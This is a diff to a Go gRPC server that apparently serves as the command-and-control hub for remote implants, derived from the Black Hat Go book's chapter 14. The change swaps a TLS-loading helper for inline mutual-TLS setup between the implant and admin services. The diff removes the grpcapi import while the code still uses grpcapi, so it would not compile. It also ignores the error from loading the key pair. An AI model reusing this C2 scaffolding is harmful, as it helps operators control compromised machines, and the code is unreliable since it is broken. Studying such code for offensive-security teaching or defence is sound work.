@@ -10,39 +10,10 @@ import (
         "errors"
         "net"
 
-        "github.com/blackhat-go/bhg/ch-14/grpcapi"
         "google.golang.org/grpc"
         "google.golang.org/grpc/credentials"
 
 )
-
-func loadTLSCredentials() (credentials.TransportCredentials, error) {
-    // Load certificate of the CA who signed client's certificate
-    pemClientCA, err := ioutil.ReadFile("/etc/nginx/certs/ca.crt")
-    if err != nil {
-        return nil, err
-    }
-
-    certPool := x509.NewCertPool()
-    if !certPool.AppendCertsFromPEM(pemClientCA) {
-        return nil, fmt.Errorf("failed to add client CA's certificate")
-    }
-
-    // Load server's certificate and private key
-    serverCert, err := tls.LoadX509KeyPair("/etc/nginx/certs/client.crt", "/etc/nginx/certs/client.key")
-    if err != nil {
-        return nil, err
-    }
-
-    // Create the credentials and return it
-    config := &tls.Config{
-        Certificates: []tls.Certificate{serverCert},
-        ClientAuth:   tls.RequireAndVerifyClientCert,
-        ClientCAs:    certPool,
-    }
-
-    return credentials.NewTLS(config), nil
-}
 
 type implantServer struct {
         work, output chan *grpcapi.Command
@@ -100,12 +71,30 @@ func main() {
                 err                            error
                 //opts                           []grpc.ServerOption
                 work, output                   chan *grpcapi.Command
-        )
-        tlsCredentials, err := loadTLSCredentials()
-        if err != nil {
-            log.Fatal("cannot load TLS credentials: ", err)
-        }
+        )  
+        
+        certificate, err := tls.LoadX509KeyPair(
+	"/etc/servers/certs/client-cert.pem",
+	"/etc/servers/certs/client-key.pem",
+	)
 
+	certPool := x509.NewCertPool()
+	bs, err := ioutil.ReadFile("/etc/servers/certs/ca-cert.pem")
+	if err != nil {
+		log.Fatalf("failed to read client ca cert: %s", err)
+	}
+
+	ok := certPool.AppendCertsFromPEM(bs)
+	if !ok {
+		log.Fatal("failed to append client certs")
+	}
+
+	tlsConfig := &tls.Config{
+		ClientAuth:   tls.RequireAndVerifyClientCert,
+		Certificates: []tls.Certificate{certificate},
+		ClientCAs:    certPool,
+	}
+        
         work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
         implant := NewImplantServer(work, output)
         admin := NewAdminServer(work, output)
@@ -115,9 +104,14 @@ func main() {
         if adminListener, err = net.Listen("tcp", fmt.Sprintf("localhost:%d", 9090)); err != nil {
                 log.Fatal(err)
         }
-        grpcAdminServer, grpcImplantServer := grpc.NewServer(grpc.Creds(tlsCredentials)),grpc.NewServer(grpc.Creds(tlsCredentials))
+        
+        serverOption := grpc.Creds(credentials.NewTLS(tlsConfig))
+        
+        grpcImplantServer := grpc.NewServer(serverOption)
+        grpcAdminServer := grpc.NewServer(serverOption)
         grpcapi.RegisterImplantServer(grpcImplantServer, implant)
         grpcapi.RegisterAdminServer(grpcAdminServer, admin)
+        
         go func() {
                 grpcImplantServer.Serve(implantListener)
         }()
